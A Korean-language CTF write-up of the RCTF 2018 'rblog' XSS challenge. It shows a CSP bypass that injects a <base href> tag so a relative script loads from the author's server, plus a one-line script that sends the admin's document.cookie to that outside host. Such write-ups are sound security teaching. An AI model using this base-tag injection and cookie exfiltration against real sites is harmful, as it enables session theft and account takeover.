---
title: "[RCTF2018] rblog Write up"
date: 2018-05-27
draft: false
category: [ctf]
subcategories: [2018]
tags: [Write-up, CTF, RCTF2018]
---

`rblog`는 `RCTF 2018`에 출제되었던 XSS 문제인데, 대회 기간에는 풀이하지 못했다가 Write-up이 올라온 후 풀어보게 되었다.
문제 정보는 아래와 같다.  

<!--more-->

```plain
get `document.cookie`
http://rblog.2018.teamrois.cn
```

### 1. 문제 분석

문제 링크에 접속하면 아래와 같은 페이지를 확인할 수 있다.  

![](/images/CTF/RCTF2018/rblog/rblog_01.PNG)  

제목과 내용을 적고, 스타일을 적용하거나 이미지를 업로드할 수 있는 기능이 있다.
또한 `최신 버전의 Chrome을 사용중인 admin`에게 신고할 수도 있다.
admin에게 신고할 때에는 특정 값을 입력해야 하는데, 이는 내가 업로드 한 블로그의 주소라는 것을 알 수 있다.  

![](/images/CTF/RCTF2018/rblog/rblog_02.PNG)  

![](/images/CTF/RCTF2018/rblog/rblog_03.PNG)  

### 2. 취약점 찾기

문제의 설명에서 `document.cookie`를 얻으라고 했으므로 `XSS` 문제인 것은 알 수 있다.
때문에 어떤 부분에서 XSS가 가능한지 알기 위해 `title`, `content`, `style`을 적용하는 부분에 아래와 같이 script 코드를 삽입 해 보았다.  

![](/images/CTF/RCTF2018/rblog/rblog_04.PNG)  

그 결과, `title` 부분에서 `script`가 정상적으로 삽입되는 것을 확인할 수 있었지만, 실행되지는 않았다.  

![](/images/CTF/RCTF2018/rblog/rblog_05.PNG)  

이 문제에도 역시나 `CSP`가 걸려있었다.
XSS 공격은 해야하는데, CSP가 걸려 있어서 어떻게 풀이해야 하나 싶었는데, 다른 사람들의 write-up을 보니 `Google`에서 만든 [CSP Evaluator](https://csp-evaluator.withgoogle.com/)를 통해 특정 사이트에 적용 된 CSP 정보를 확인할 수 있었다.
문제의 URL을 넣고 확인 해 보니 `base-uri`에 대한 보호가 적용되어 있지 않았다.  

![](/images/CTF/RCTF2018/rblog/rblog_06.PNG)  

즉, `<base>`라는 태그를 사용하여 소스코드 상에서 사용된 상대 경로의 기준이 될 경로를 지정할 수 있다.
만약 소스코드에서 css 파일이나 js 파일 등을 참조할 때 `./css/style.css`라는 상대 경로가 있을 경우, `<base>` 태그를 이용해 따로 경로를 설정해 주지 않는 한 `현재 페이지의 경로를 기준`으로 `style.css`를 찾아간다.

그런데 만약 `<base>` 태그를 이용 해 `<base href="http://www.test.com/">`와 같이 기준 경로를 바꾸어 줄 경우, `설정해 준 경로를 기준`으로 파일을 찾아가게 된다.
따라서 `<base>` 태그를 이용 해 기준 경로를 바꾸어 준다면, 문제의 소스코드 내에서 사용하는 js나 css를 내가 원하는 파일로 바꾸어 실행시킬 수 있다.

우리는 `document.cookie`를 얻어야 하므로, js 파일을 사용하는 부분을 찾아보았다.
다시 소스코드를 살펴보니 내가 업로드 한 블로그 글의 하단에서 아래와 같이 js 파일을 실행시키는 것을 확인할 수 있었다.  

![](/images/CTF/RCTF2018/rblog/rblog_07.PNG)  

따라서 `<base>` 태그를 이용 해 기준 경로를 바꾸어 준 후, 바꾼 경로에 `/assets/js/jquery.min.js` 파일을 만든다면, 내가 원하는 코드를 실행시킬 수 있게 된다.  

### 3. 문제 풀이

나는 내 서버와 도메인을 갖고 있기 때문에 내 서버를 사용했다.
내 서버에 `/assets/js/` 디렉토리 아래에 `jquery.min.js` 파일을 생성한 후, 아래와 같이 소스코드를 구현하였다.  

```js
location.href = "http://ccoma.me/?" + document.cookie;
```

이 후 title에 `<base href="http://ccoma.me/"/>` 를 넣어 글을 올린다면 기준 경로가 내 도메인이 되어 `<script nonce="af8d8b049007ffdddf9d4104295d126e" src="/assets/js/jquery.min.js"></script>`는 실제로는 `http://ccoma.me/assets/js/jquery.min/js`를 실행하게 된다.
이 때, 해당 경로에는 `location.href = "http://ccoma.me/?" + document.cookie;`가 있으므로 `document.cookie`의 값을 인자로 해 해당 도메인에 접근하게 될 것이다.  

글을 업로드 한 후에 해당 글의 경로를 admin에게 신고하면 admin이 해당 글에 접근할 것이며, 결론적으로 admin의 cookie를 인자로 해당 도메인에 다시 접근하게 된다.
먼저 아래와 같이 글을 올려 보았다.  

![](/images/CTF/RCTF2018/rblog/rblog_08.PNG)  

`jquery.min.js`에는 `location.href`가 구현되어 있기 때문에 내 서버로 리다이렉트 될 것이다.
때문에 `burp suite`를 이용 해 `Response`를 잡아 블로그 글의 주소를 캡쳐 했다.  

![](/images/CTF/RCTF2018/rblog/rblog_09.PNG)  

이 후 해당 글의 링크를 admin에게 보내주었다.  

![](/images/CTF/RCTF2018/rblog/rblog_10.PNG)  

![](/images/CTF/RCTF2018/rblog/rblog_11.PNG)  

그러면 admin이 내 서버로 접근하게 되는데, 이 때 GET 방식으로 cookie가 넘어오게 되므로 이를 확인하기 위해 `access.log`를 확인 해 보았다.  

```sh
$ tail -f /var/log/apache2/access.log
```

전송 후에 짧게는 몇 초, 길게는 2분 정도를 기다리면 아래와 같이 flag가 함께 전송된 것을 확인할 수 있다.  

![](/images/CTF/RCTF2018/rblog/rblog_12.PNG)  

```plain
FLAG : RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012}
```
